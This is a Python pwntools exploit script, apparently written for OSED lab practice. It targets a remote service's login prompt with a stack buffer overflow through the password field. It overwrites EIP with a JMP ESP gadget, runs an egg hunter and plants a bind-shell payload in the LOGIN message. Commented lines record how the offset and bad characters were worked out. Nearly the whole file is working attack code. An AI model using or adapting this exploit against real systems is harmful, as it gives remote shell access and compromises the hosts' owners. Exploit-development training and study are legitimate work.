#!/usr/bin/env python3

# for the SEH exploit, we target port 9121

import time, os, traceback, sys, os
import pwn
import binascii, array
from struct import pack
from textwrap import wrap

# add path for osed libs
sys.path.append("/home/kali/OSED/exploitLibs")
import osed_payloads

#
# Define Functions
#
def start(argv=[], *a, **kw):
    if pwn.args.GDB: # use the gdb script, sudo apt install gdbserver
        return pwn.gdb.debug([binPath], gdbscript=gdbscript, aslr=False)
    elif pwn.args.REMOTE: # ['server', 'port']
        return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: # run locally, no GDB
        return pwn.process([binPath])

#
# Begin exploit
#

binPath="remoteONLY!!!"
isRemote = pwn.args.REMOTE
server = sys.argv[1]

# build in GDB support
gdbscript = '''
init-pwndbg
break *getData+39
continue
'''.format(**locals())

# interact with the program to get to where we can exploit
pwn.context.log_level="DEBUG"
io = start()


size = 2000
#buffer = b"A"*size

# find offset
#buffer = osed_payloads.create_pattern(size)

offset = 64
#buffer = b"A"*offset + b"BBBB"
#buffer += b"C"*(size-len(buffer))

# bad characters:  \x00, \x0a
#badChars = osed_payloads.generate_all_hex_bytes()
#badChars.remove(b"\x00")
#badChars.remove(b"\x0a")
#someChars = badChars[184:] #180
#jmpESP = pwn.p32(0x66601114)
#buffer = b"A"*offset + jmpESP + b"B"*(size-offset-len(someChars)-8) + b"DDDD"+ b"".join(someChars)

# egg hunter
eggID = b"w00t"
eggHunter = osed_payloads.make_egg(eggID)
#eggHunter = osed_payloads.make_egg_SEH(eggID)
eggHunter = b"\x90"*20 + eggHunter

# control EIP
jmpESP = pwn.p32(0x66601114)
buffer = b"A"*offset + jmpESP
buffer += eggHunter
buffer += b"B"*(size-offset-len(eggHunter))

# generate payload
bindshell = osed_payloads.make_bindshell()
bindshell = b"\x90"*20 + bindshell

# Find more room for payload: no badchars!
egg = b"w00tw00t"
#payload= egg + b"D"*400
payload = egg + bindshell + b"DDDD"
# bad characters:
#badChars = osed_payloads.generate_all_hex_bytes()
#room = egg + b"".join(badChars) + b"DDDD"


login_buffer = b"LOGIN\r\n" + payload
username_buffer = b"admin\r\n"
password_buffer = buffer + b"\r\n"

pwn.info("Remote only! Should be targeting port.")

pwn.info("Payload length: %d",len(buffer))

io.recvuntil(b"Input:")
io.send(login_buffer)

io.recvuntil(b"Username:")
io.send(username_buffer)

io.recvuntil(b"Password:")
io.send(password_buffer)

io.close()

io.interactive()
